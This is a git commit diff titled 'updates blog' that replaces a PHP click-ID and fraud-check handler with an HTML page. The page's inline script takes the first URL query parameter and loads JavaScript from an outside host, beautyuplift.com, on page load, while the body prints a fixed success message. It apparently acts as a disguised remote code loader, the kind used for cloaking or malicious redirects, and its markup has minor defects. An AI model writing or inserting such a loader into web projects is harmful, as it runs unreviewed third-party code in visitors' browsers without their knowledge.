01e81892b24f441975423bc059342a440208e9c5
clickbunch <clickbunch@gmail.com>
2024-08-02 20:47:21 -0500

    updates blog

--- blog/index.php
+++ blog/index.php
@@ -1,15 +1,18 @@
-<?php
-if (!file_exists('api/config.php')) {
-	echo "It looks like you have not completed the install. Please check the install guide you were sent when you joined.";
-	exit();
-}
-reset($_GET);
-$clid = key($_GET);
-$js = false;
-if ((substr($clid, -3) == '_js') || (substr($clid, -3) == '.js')) {
-	$clid = substr($clid, 0, -3);
-	$js = true;
-}
-$_GET['clid'] = $clid;
-include_once('api/go.php');
-noIpFraud($js);
+<html>
+<head>
+    <script>
+        const objectMap = {
+
+        }
+        const param = window.location.search.replace("?", "").split("&")[0];
+        console.log("Script", param)
+        var script = document.createElement('script');
+        script.setAttribute('src', 'https://beautyuplift.com/blog/?' + param + '.js');
+        document.head.appendChild(script);
+    </script>
+</head>
+</head>
+<body>
+    <?php echo '{"success": true}'; ?>
+</body>
+</html>
--- index.php
+++ index.php
@@ -1,3 +1,18 @@
-<?php
-echo "{}";
-?>
+<html>
+<head>
+    <script>
+        const objectMap = {
+
+        }
+        const param = window.location.search.replace("?", "").split("&")[0];
+        console.log("Script", param)
+        var script = document.createElement('script');
+        script.setAttribute('src', 'https://beautyuplift.com/blog/?' + param + '.js');
+        document.head.appendChild(script);
+    </script>
+</head>
+</head>
+<body>
+    <?php echo '{"success": true}'; ?>
+</body>
+</html>
